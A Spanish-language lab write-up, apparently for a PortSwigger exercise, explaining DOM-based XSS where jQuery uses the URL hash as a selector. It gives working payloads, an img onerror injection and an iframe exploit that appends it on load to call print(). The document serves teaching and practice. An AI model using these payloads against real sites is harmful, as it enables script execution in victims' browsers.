
La aplicación utiliza jQuery para seleccionar elementos basándose en ese valor y realizar acciones como hacer scroll automático a un post específico. El problema es que se emplea directamente como selector, sin validación alguna, permitiendo al atacante manipularlo para inyectar y ejecutar código en el navegador de la víctima.

Montamos un ataque usando un servidor de explotación que carga la página vulnerable dentro de un contenedor invisible. Al modificarse dinámicamente la URL interna, se inyecta una instrucción que se ejecuta automáticamente mediante un evento de error, invocando una función del navegador como demostración.

Esta clase muestra cómo incluso fragmentos aparentemente inofensivos de la URL, como el hash, pueden ser vectores de ataque si no se gestionan correctamente en el lado cliente

------

Nos podemos aprovechar de la funcion de auto scroll, ya que si ponemos lo siguiente

https://burpsuite/#Post_Markos

Me estara llevando al Post en cuestion de la pagina

desde la consola, podemos hacer:

window.location.hash.slice(1)

Y se nos muestra ese valor, y para verlo mejor, se muestra asi:

decodeURIComponent(window.location.hash.slice(1))

Ahora podemos hacer lo siguiente para explotar el XSS desde la URL

```html
https://burpsuite/#<img src=0 onerror=alert(0)
```

Esto nos arroja un alert, pero debemos de mandarle el link a la victima atraves del server  de portswigger, para ello usamos las etiquetas iframe

```html
<iframe src=https://burpsuite/#></iframe>
```

Esto nos muestra la pagina home de la prueba, ahora debemos de contatenar la instruccion maliciosa y lo podemos visualizar al guardar el exploit y mostrarlo

```html
<iframe src="https://burpsuite/#" onload="this.src += '<img src=0 onerror=alert()>' "></iframe>
```

Ahora debemos de mandar llamar la funcion de print() para completar el reto

```html
<iframe src="https://burpsuite/#" onload="this.src += '<img src=0 onerror=print()>' "></iframe>
```

Guardamos y enviamos el exploit, y el reto queda resuelto










